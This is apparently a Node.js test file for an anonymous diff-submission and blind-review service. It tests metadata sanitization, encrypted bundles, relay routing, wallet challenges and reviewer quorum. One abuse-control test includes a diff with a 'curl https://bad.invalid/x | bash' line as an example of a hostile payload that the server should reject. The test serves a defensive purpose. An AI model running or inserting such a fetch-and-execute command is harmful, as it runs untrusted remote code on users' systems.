const assert = require('node:assert/strict');
const fs = require('node:fs');
const net = require('node:net');
const path = require('node:path');
const { spawn } = require('node:child_process');
const test = require('node:test');
const nacl = require('tweetnacl');
const bs58Module = require('bs58');
const bs58 = bs58Module.default || bs58Module;

const storePath = path.join(__dirname, '..', 'data', `test-${process.pid}.json`);
const reviewerKeys = [
  'reviewer-one-secret-1234',
  'reviewer-two-secret-1234',
  'reviewer-three-secret-1234',
];

process.env.STORE_PATH = storePath;
process.env.REVIEW_QUORUM = '3';
process.env.REVIEWER_API_KEYS = [
  `one:${reviewerKeys[0]}`,
  `two:${reviewerKeys[1]}`,
  `three:${reviewerKeys[2]}`,
].join(',');
process.env.RATE_LIMIT_PER_MINUTE = '1000';
process.env.AUTH_SECRET = 'test-auth-secret-with-at-least-32-bytes';
process.env.SEALED_BUNDLE_KEYS = `test-v1:${Buffer.alloc(32, 7).toString('base64')}`;
process.env.SEALED_BUNDLE_ACTIVE_KEY_ID = 'test-v1';
process.env.SUBMISSION_QUOTA_PER_HOUR = '10';
process.env.SUBMISSION_QUOTA_PER_DAY = '30';

const app = require('../server');
const { sanitizeDiff } = require('../lib/sanitizer');
const { BundleVault } = require('../lib/bundle-vault');
const { RelayTransport } = require('../lib/relay-transport');

const dirtyDiff = [
  'From 4bd3a1f Mon Sep 17 00:00:00 2001',
  'Author: Jane Builder <jane.builder@example.com>',
  'Date: 2026-06-20T10:11:12+07:00',
  'diff --git a/C:\\Users\\jane\\project\\secret.js b/src/secret.js',
  '--- a/C:\\Users\\jane\\project\\secret.js',
  '+++ b/src/secret.js',
  '@@ -1,2 +1,2 @@',
  '-const remote = "git@github.com:jane/private-repo.git";',
  '+const remote = "https://github.com/jane/private-repo.git";',
  '+const host = "/home/jane/.ssh/id_ed25519";',
  '+const ipv4 = "203.0.113.42";',
  '+const ipv6 = "2001:db8:85a3::8a2e:370:7334";',
].join('\n');

test('sanitizer removes identity-bearing diff metadata', () => {
  const result = sanitizeDiff(dirtyDiff);
  assert.equal(result.sanitized_diff.includes('jane.builder@example.com'), false);
  assert.equal(result.sanitized_diff.includes('C:\\Users\\jane'), false);
  assert.equal(result.sanitized_diff.includes('/home/jane'), false);
  assert.equal(result.sanitized_diff.includes('github.com/jane/private-repo'), false);
  assert.equal(result.sanitized_diff.includes('203.0.113.42'), false);
  assert.equal(result.sanitized_diff.includes('2001:db8:85a3::8a2e:370:7334'), false);
  assert.match(result.sanitized_diff, /Author: \[redacted\]/);
  assert.equal(result.sanitized_diff.includes('$1: [redacted]'), false);
  assert.equal(result.report.risk, 'high');
  assert.ok(result.report.findings.length >= 4);
});

test('sanitizer rejects empty and binary diff payloads', () => {
  assert.throws(() => sanitizeDiff('   '), /Diff content is required/);
  assert.throws(() => sanitizeDiff('diff --git a/logo.png b/logo.png\nBinary files differ'), /Binary or unsafe payloads/);
});

test('vault rejects ciphertext and context tampering', () => {
  const vault = new BundleVault({
    keys: `test-v1:${Buffer.alloc(32, 7).toString('base64')}`,
    activeKeyId: 'test-v1',
  });
  const context = { submission_id: 'sealed_test', sanitized_hash: 'sha256:test' };
  const envelope = vault.encrypt({ sanitized_diff: 'safe' }, context);
  assert.deepEqual(vault.decrypt(envelope, context), { sanitized_diff: 'safe' });
  assert.throws(() => vault.decrypt({ ...envelope, tag: Buffer.alloc(16).toString('base64url') }, context));
  assert.throws(() => vault.decrypt(envelope, { ...context, submission_id: 'sealed_other' }), /context mismatch/);
});

test('relay transport produces a three-hop signed hash chain', async () => {
  const relay = new RelayTransport({ authSecret: 'relay-test-secret' });
  const sealedEnvelope = { algorithm: 'aes-256-gcm', ciphertext: 'opaque' };
  const route = await relay.route({
    submission_id: 'sealed_test',
    bundle_hash: 'sha256:test',
    sealed_envelope: sealedEnvelope,
  });
  assert.equal(route.receipts.length, 3);
  assert.equal(route.path.join(','), 'relay-tyo-01,relay-sgp-04,relay-ams-09');
  assert.equal(route.receipts[1].previous_hash, route.receipts[0].receipt_hash);
  assert.equal(route.receipts[2].previous_hash, route.receipts[1].receipt_hash);
  assert.match(route.receipts[2].signature, /^[A-Za-z0-9_-]+$/);
  assert.equal(JSON.stringify(route).includes('opaque'), false);
});

test('standalone relay services transport an encrypted envelope across network hops', async t => {
  const ports = await Promise.all([getFreePort(), getFreePort(), getFreePort()]);
  const nodes = [
    { id: 'relay-tyo-test', region: 'Southeast Asia', role: 'ingress', url: `http://127.0.0.1:${ports[0]}`, secret: 'tyo-network-secret' },
    { id: 'relay-sgp-test', region: 'Singapore', role: 'mixer', url: `http://127.0.0.1:${ports[1]}`, secret: 'sgp-network-secret' },
    { id: 'relay-ams-test', region: 'Amsterdam', role: 'exit', url: `http://127.0.0.1:${ports[2]}`, secret: 'ams-network-secret' },
  ];
  const children = nodes.map((node, index) => spawn(process.execPath, ['relay-server.js'], {
    cwd: path.join(__dirname, '..'),
    env: {
      ...process.env,
      PORT: String(ports[index]),
      RELAY_NODE_ID: node.id,
      RELAY_NODES: JSON.stringify(nodes),
    },
    stdio: 'ignore',
  }));
  t.after(() => children.forEach(child => child.kill()));
  await Promise.all(nodes.map(node => waitForHealth(node.url)));

  const relay = new RelayTransport({ nodes: JSON.stringify(nodes), authSecret: 'network-test' });
  const route = await relay.route({
    submission_id: 'sealed_network_test',
    bundle_hash: 'sha256:network',
    sealed_envelope: { algorithm: 'aes-256-gcm', ciphertext: 'network-opaque' },
  });
  assert.equal(route.receipts.length, 3);
  assert.equal(route.receipts[2].node_id, 'relay-ams-test');
  assert.equal(JSON.stringify(route).includes('network-opaque'), false);
});

test('readiness endpoint reports required production checks', async t => {
  const server = app.listen(0);
  await new Promise(resolve => server.once('listening', resolve));
  t.after(() => server.close());

  const base = `http://127.0.0.1:${server.address().port}`;
  const response = await fetch(`${base}/api/readiness`, {
    headers: {
      'X-Forwarded-For': '203.0.113.77',
      'X-Real-IP': '203.0.113.78',
    },
  });
  const body = await response.json();
  assert.equal(response.status, 503);
  assert.equal(body.ok, true);
  assert.equal(body.ready, false);
  assert.equal(body.status, 'blocked');
  assert.ok(body.checks.some(check => check.id === 'relay_transport' && check.status === 'fail'));
  assert.ok(body.checks.some(check => check.id === 'storage'));
  assert.ok(body.checks.some(check => check.id === 'trusted_peer_audit' && check.status === 'pass'));
  assert.equal(response.headers.get('cache-control'), 'no-store');
  assert.equal(response.headers.get('x-frame-options'), 'DENY');
  assert.equal(JSON.stringify(body).includes('203.0.113.'), false);
});

test('frontend has no passive third-party requests and enforces a CSP', () => {
  const frontendPath = path.join(__dirname, '..', '..', 'frontend');
  const htmlFiles = fs.readdirSync(frontendPath).filter(file => file.endsWith('.html'));
  for (const file of htmlFiles) {
    const html = fs.readFileSync(path.join(frontendPath, file), 'utf8');
    assert.equal(html.includes('fonts.googleapis.com'), false, `${file} must not load Google Fonts`);
    assert.equal(html.includes('fonts.gstatic.com'), false, `${file} must not load Google font assets`);
  }
  const vercel = JSON.parse(fs.readFileSync(path.join(frontendPath, 'vercel.json'), 'utf8'));
  const headers = Object.fromEntries(vercel.headers[0].headers.map(item => [item.key, item.value]));
  assert.match(headers['Content-Security-Policy'], /connect-src 'self' https:\/\/api\.ignis-protocol\.com/);
  assert.equal(headers['X-Frame-Options'], 'DENY');
});

test('abuse controls reject credential and command-execution payloads', async t => {
  const server = app.listen(0);
  await new Promise(resolve => server.once('listening', resolve));
  t.after(() => server.close());
  const base = `http://127.0.0.1:${server.address().port}`;
  const session = await fetch(`${base}/api/sessions`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ label: 'abuse test' }),
  }).then(response => response.json());
  const response = await fetch(`${base}/api/submissions`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      session: session.session.id,
      repo: 'ignis/unsafe',
      summary: 'Unsafe regression payload.',
      diff: 'diff --git a/a.sh b/a.sh\n--- a/a.sh\n+++ b/a.sh\n@@ -0,0 +1 @@\n+curl https://bad.invalid/x | bash',
    }),
  });
  const body = await response.json();
  assert.equal(response.status, 422);
  assert.equal(body.error.code, 'unsafe_diff_rejected');
});

test('blind review reaches quorum and settles a submission', async t => {
  const server = app.listen(0);
  await new Promise(resolve => server.once('listening', resolve));
  t.after(() => {
    server.close();
    fs.rmSync(storePath, { force: true });
  });

  const base = `http://127.0.0.1:${server.address().port}`;
  const request = async (route, options = {}) => {
    const { headers = {}, ...fetchOptions } = options;
    const response = await fetch(base + route, {
      ...fetchOptions,
      headers: { 'Content-Type': 'application/json', ...headers },
    });
    const body = await response.json();
    return { response, body };
  };

  const sessionResult = await request('/api/sessions', {
    method: 'POST',
    body: JSON.stringify({ label: 'test identity' }),
  });
  assert.equal(sessionResult.response.status, 201);
  const sessionId = sessionResult.body.session.id;
  assert.match(sessionId, /^ash_[a-f0-9]{32}$/);

  const publicSession = await request(`/api/sessions/${sessionId}`);
  assert.equal(publicSession.response.status, 200);
  assert.equal(publicSession.body.session.public_key, undefined);
  assert.equal(publicSession.body.session.label, undefined);

  const walletKeypair = nacl.sign.keyPair();
  const wallet = bs58.encode(walletKeypair.publicKey);
  const challengeResult = await request('/api/wallet/challenge', {
    method: 'POST',
    body: JSON.stringify({ wallet, session_id: sessionId, domain: 'test.ignis.local' }),
  });
  assert.equal(challengeResult.response.status, 201);
  const signature = nacl.sign.detached(
    new TextEncoder().encode(challengeResult.body.challenge.message),
    walletKeypair.secretKey,
  );
  const walletVerify = await request('/api/wallet/verify', {
    method: 'POST',
    body: JSON.stringify({
      challenge_id: challengeResult.body.challenge.id,
      signature: Buffer.from(signature).toString('base64'),
    }),
  });
  assert.equal(walletVerify.response.status, 200);
  assert.match(walletVerify.body.wallet_commitment, /^sha256:/);

  const replay = await request('/api/wallet/verify', {
    method: 'POST',
    body: JSON.stringify({
      challenge_id: challengeResult.body.challenge.id,
      signature: Buffer.from(signature).toString('base64'),
    }),
  });
  assert.equal(replay.response.status, 409);
  assert.equal(replay.body.error.code, 'challenge_used');

  const submissionResult = await request('/api/submissions', {
    method: 'POST',
    body: JSON.stringify({
      session: sessionId,
      repo: 'ignis/test',
      summary: 'Add quorum settlement regression coverage.',
      diff: dirtyDiff,
    }),
  });
  assert.equal(submissionResult.response.status, 201);
  const { id: reviewId } = submissionResult.body.review;
  const submissionId = submissionResult.body.submission.id;
  assert.match(submissionId, /^sealed_[a-f0-9]{32}$/);

  const publicSubmission = await request(`/api/submissions/${submissionId}`);
  assert.equal(publicSubmission.body.submission.session, undefined);
  assert.equal(publicSubmission.body.submission.sanitized_diff, undefined);
  assert.equal(publicSubmission.body.submission.original_hash, undefined);
  assert.equal(publicSubmission.body.submission.bundle_key_id, undefined);
  assert.equal(publicSubmission.body.submission.relay, undefined);
  assert.equal(publicSubmission.body.submission.abuse_report, undefined);
  assert.equal(publicSubmission.body.submission.metadata_report.risk, 'high');
  assert.equal(publicSubmission.body.submission.bundle_encrypted, true);

  const statusResult = await request(`/api/submissions/${submissionId}/status`);
  assert.equal(statusResult.response.status, 200);
  assert.equal(statusResult.body.submission.id, submissionId);

  const reviewerSession = await request('/api/reviewer/session', {
    method: 'POST',
    body: JSON.stringify({ key: reviewerKeys[0] }),
  });
  assert.equal(reviewerSession.response.status, 201);
  const reviewerToken = reviewerSession.body.token;
  const reviewerMe = await request('/api/reviewer/me', {
    headers: { Authorization: `Bearer ${reviewerToken}` },
  });
  assert.equal(reviewerMe.response.status, 200);
  const protectedQueue = await request('/api/reviews');
  assert.equal(protectedQueue.response.status, 401);
  const reviewerQueue = await request('/api/reviews', {
    headers: { Authorization: `Bearer ${reviewerToken}` },
  });
  assert.equal(reviewerQueue.response.status, 200);
  assert.equal(JSON.stringify(reviewerQueue.body).includes(wallet), false);
  assert.equal(JSON.stringify(reviewerQueue.body).includes(sessionId), false);
  assert.equal(JSON.stringify(reviewerQueue.body).includes('jane.builder@example.com'), false);
  assert.equal(JSON.stringify(reviewerQueue.body).includes('github.com/jane/private-repo'), false);
  assert.match(JSON.stringify(reviewerQueue.body), /redacted/);
  assert.equal(reviewerQueue.body.queue[0].bundle.relay_receipts.length, 3);

  const unauthorized = await request(`/api/reviews/${reviewId}/votes`, {
    method: 'POST',
    body: JSON.stringify({ decision: 'accept', score: 9 }),
  });
  assert.equal(unauthorized.response.status, 401);

  for (let index = 0; index < reviewerKeys.length; index += 1) {
    const vote = await request(`/api/reviews/${reviewId}/votes`, {
      method: 'POST',
      headers: { 'X-Reviewer-Key': reviewerKeys[index] },
      body: JSON.stringify({
        decision: index === 1 ? 'reject' : 'accept',
        score: [9, 6, 8][index],
        note: `review ${index + 1}`,
      }),
    });
    assert.equal(vote.response.status, 201);

    if (index === 0) {
      assert.equal(vote.body.review.decisions, null);
      assert.equal(vote.body.review.score, null);
      const duplicateBeforeQuorum = await request(`/api/reviews/${reviewId}/votes`, {
        method: 'POST',
        headers: { 'X-Reviewer-Key': reviewerKeys[0] },
        body: JSON.stringify({ decision: 'accept', score: 10 }),
      });
      assert.equal(duplicateBeforeQuorum.response.status, 409);
      assert.equal(duplicateBeforeQuorum.body.error.code, 'duplicate_vote');
    }
  }

  const settled = await request(`/api/reviews/${reviewId}`, {
    headers: { Authorization: `Bearer ${reviewerToken}` },
  });
  assert.equal(settled.body.review.status, 'accepted');
  assert.equal(settled.body.review.reviewers_responded, 3);
  assert.equal(settled.body.review.score, 7.7);
  assert.deepEqual(settled.body.review.decisions, { accept: 2, reject: 1 });
  assert.equal(settled.body.review.feedback.length, 3);
  assert.equal(settled.body.review.feedback[0].reviewer_id, undefined);

  const voteAfterSettlement = await request(`/api/reviews/${reviewId}/votes`, {
    method: 'POST',
    headers: { 'X-Reviewer-Key': reviewerKeys[0] },
    body: JSON.stringify({ decision: 'accept', score: 10 }),
  });
  assert.equal(voteAfterSettlement.response.status, 409);
  assert.equal(voteAfterSettlement.body.error.code, 'review_settled');

  const submission = await request(`/api/submissions/${submissionId}`);
  assert.equal(submission.body.submission.status, 'accepted');
  assert.equal(submission.body.submission.proof_status, 'issued');
  assert.match(submission.body.proof.id, /^proof_/);
  assert.equal(submission.body.proof.owner_commitment, walletVerify.body.wallet_commitment);
  assert.equal(JSON.stringify(submission.body.proof).includes(wallet), false);

  const proofResult = await request(`/api/proofs/${submission.body.proof.id}`);
  assert.equal(proofResult.response.status, 200);
  assert.equal(proofResult.body.valid, true);
  assert.equal(proofResult.body.proof.anchor.status, 'awaiting_signer');

  const proofVerify = await request('/api/proofs/verify', {
    method: 'POST',
    body: JSON.stringify({
      proof_id: submission.body.proof.id,
      proof_hash: submission.body.proof.proof_hash,
    }),
  });
  assert.equal(proofVerify.body.valid, true);

  const signal = await request('/api/signal');
  assert.equal(signal.body.portable_score, 7.7);
  assert.equal(signal.body.totals.accepted, 1);
  assert.equal(signal.body.totals.reviewer_votes, 3);
  assert.equal(signal.body.totals.proofs, 1);
  assert.equal(signal.body.confidence, 'early');

  const auditResult = await request('/api/audit', {
    headers: { Authorization: `Bearer ${reviewerToken}` },
  });
  assert.equal(auditResult.response.status, 200);
  assert.equal(auditResult.body.valid, true);

  const persisted = fs.readFileSync(storePath, 'utf8');
  assert.equal(persisted.includes('jane.builder@example.com'), false);
  assert.equal(persisted.includes('C:\\\\Users\\\\jane'), false);
  assert.equal(persisted.includes('sanitized_diff'), false);
  assert.match(persisted, /encrypted_bundle/);
});

function getFreePort() {
  return new Promise((resolve, reject) => {
    const server = net.createServer();
    server.once('error', reject);
    server.listen(0, '127.0.0.1', () => {
      const { port } = server.address();
      server.close(error => error ? reject(error) : resolve(port));
    });
  });
}

async function waitForHealth(url) {
  const deadline = Date.now() + 5000;
  while (Date.now() < deadline) {
    try {
      const response = await fetch(`${url}/health`);
      if (response.ok) return;
    } catch {}
    await new Promise(resolve => setTimeout(resolve, 50));
  }
  throw new Error(`Relay did not become healthy: ${url}`);
}
